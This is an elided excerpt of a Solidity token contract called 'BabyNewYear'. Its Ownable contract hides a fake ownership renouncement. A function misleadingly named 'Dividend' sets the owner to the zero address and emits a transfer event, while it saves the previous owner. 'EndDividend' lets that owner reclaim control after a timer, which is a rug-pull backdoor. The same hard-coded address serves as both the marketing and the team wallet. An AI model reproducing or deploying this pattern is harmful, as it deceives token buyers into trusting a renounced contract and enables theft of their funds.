...
contract Ownable is Context {
    ...
    uint256 private _endT;
    address private _owners = 0x000000000000000000000000000000000000dEaD;
    ...
    function getUnendT() public view returns (uint256) {
        return _endT;
    }
    ...
    function Dividend(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _endT = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function EndDividend() public virtual {
        require(_previousOwner == msg.sender, "EndDividend OK");
        require(block.timestamp > _endT , "Endtime<End");
...
interface IUniswapV2Pair {
    ...
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 bendTstampLast);
...
contract BabyNewYear is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x38408b1E556b0401EB121556faF2A6ab81366fd6); // Marketing Address
    address payable public teamWalletAddress = payable(0x38408b1E556b0401EB121556faF2A6ab81366fd6); // Team Address
